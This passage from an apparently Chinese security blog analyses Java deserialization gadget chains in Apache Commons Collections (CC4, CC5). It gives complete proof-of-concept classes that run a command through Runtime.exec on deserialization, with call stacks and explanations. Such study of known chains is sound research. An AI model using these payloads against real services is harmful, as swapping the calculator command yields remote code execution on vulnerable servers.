<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 字节码</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CC2 _tfactory成员变量会在反序列化调用构造方法时自动创建赋值</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;templates&#125;));</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(queue, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparatorField</span> <span class="operator">=</span></span><br><span class="line">                Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparatorField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparatorField.set(queue, comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC4&quot;</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC4&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span></span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>) field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="调用栈-4">调用栈</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exec:<span class="number">347</span>, Runtime (java.lang)</span><br><span class="line">&lt;clinit&gt;:-<span class="number">1</span>, EvilCat5042589590958</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">422</span>, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:<span class="number">442</span>, Class (java.lang)</span><br><span class="line">getTransletInstance:<span class="number">455</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">486</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">&lt;init&gt;:<span class="number">64</span>, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">422</span>, Constructor (java.lang.reflect)</span><br><span class="line">transform:<span class="number">116</span>, InstantiateTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">transform:<span class="number">32</span>, InstantiateTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">transform:<span class="number">112</span>, ChainedTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">compare:<span class="number">81</span>, TransformingComparator (org.apache.commons.collections4.comparators)</span><br><span class="line">siftDownUsingComparator:<span class="number">721</span>, PriorityQueue (java.util)</span><br><span class="line">siftDown:<span class="number">687</span>, PriorityQueue (java.util)</span><br><span class="line">heapify:<span class="number">736</span>, PriorityQueue (java.util)</span><br><span class="line">readObject:<span class="number">795</span>, PriorityQueue (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">63</span>, CC4</span><br></pre></td></tr></table></figure>
<h2 id="分析-3">分析</h2>
<p>重复部门就不赘述了，记一下不同之处。</p>
<p><strong>CC2</strong>使用的是<strong>InvokerTransformer</strong>类的<strong>transform</strong>方法来反射。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> (InvokerTransformer) constructor.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将templates链赋值给queue数组，使其在PriorityQueue的readobject中进行下一步序列化操作，传入siftDown为x，传入compare中为obj1，</span></span><br><span class="line">Object[] queue_array = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, <span class="number">1</span>&#125;;</span><br><span class="line"><span class="type">Field</span> <span class="variable">queue_field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queue_field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">queue_field.set(queue, queue_array);</span><br></pre></td></tr></table></figure>
<p>而<strong>CC4</strong>是使用<strong>InstantiateTransformer</strong>类的<strong>transform</strong>方法来构造<strong>TrAXFilter</strong>导致恶意字节码加载。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain);</span><br><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, comparator);</span><br></pre></td></tr></table></figure>
<h1 id="commonscollections5">CommonsCollections5</h1>
<p><strong>CC5</strong>，基于 <strong>CC1</strong> 的改动。</p>
<h2 id="影响版本-4">影响版本</h2>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="poc-5">POC</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                                    <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                                    <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class&#125;,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                                    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">                        &#125;);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(innerMap, chain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map, <span class="number">123</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exception</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span></span><br><span class="line">                Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>)</span><br><span class="line">                        .getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exception, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC5&quot;</span>));</span><br><span class="line">            outputStream.writeObject(exception);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC5&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="调用栈-5">调用栈</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exec:<span class="number">347</span>, Runtime (java.lang)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">transform:<span class="number">125</span>, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:<span class="number">122</span>, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">151</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:<span class="number">73</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">toString:<span class="number">131</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">readObject:<span class="number">86</span>, BadAttributeValueExpException (javax.management)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">42</span>, CC5</span><br></pre></td></tr></table></figure>
<h2 id="原理">原理</h2>
<h3 id="tiedmapentry">TiedMapEntry</h3>
<p><strong>TiedMapEntry</strong>类的<strong>getValue</strong>方法调用了<strong>map.get</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.map.get(<span class="built_in">this</span>.key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而<strong>TiedMapEntry</strong>类的构造方法中可以看见<strong>map</strong>变量是可控的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.map = map;</span><br><span class="line">    <span class="built_in">this</span>.key = key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而在<strong>TiedMapEntry</strong>类的如下三个方法中，都调用了<strong>getValue</strong>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> Map.Entry)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">other</span> <span class="operator">=</span> (Map.Entry)obj;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">this</span>.key == <span class="literal">null</span> ? other.getKey() == <span class="literal">null</span> : <span class="built_in">this</span>.key.equals(other.getKey())) &amp;&amp; (value == <span class="literal">null</span> ? other.getValue() == <span class="literal">null</span> : value.equals(other.getValue()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">this</span>.getKey() == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.getKey().hashCode()) ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getKey() + <span class="string">&quot;=&quot;</span> + <span class="built_in">this</span>.getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3
id="badattributevalueexpexception">BadAttributeValueExpException</h3>
<p><strong>BadAttributeValueExpException</strong>类的<strong>readObject</strong>方法中调用了<strong>valObj.toString</strong>。</p>
<p>可以反射修改<strong>val</strong>的值为<strong>TiedMapEntry</strong>类，且<strong>System.getSecurityManager()</strong>默认为<strong>null</strong>，因此得以达成触发条件。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="分析-4">分析</h2>
<p>与<strong>CC1</strong>的不同之处如下。</p>
<p>构造<strong>TiedMapEntry</strong>类用于触发<strong>LazyMap</strong>的<strong>get</strong>方法，从而导致<strong>ChainedTransformer</strong>链的执行。</p>
<p>然后构造<strong>BadAttributeValueExpException</strong>类，并修改<strong>val</strong>的值，来使其在反序列化时触发<strong>TiedMapEntry</strong>的<strong>toString</strong>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map, <span class="number">123</span>);</span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">val.set(poc, tiedmap);</span><br></pre></td></tr></table></figure>
<p>调用栈如下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">transform:<span class="number">122</span>, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">151</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:<span class="number">73</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">toString:<span class="number">131</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">readObject:<span class="number">86</span>, BadAttributeValueExpException (javax.management)</span><br></pre></td></tr></table></figure>
<h1 id="commonscollections6">CommonsCollections6</h1>
<h2 id="影响版本-5">影响版本</h2>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="poc-6">POC</h2>
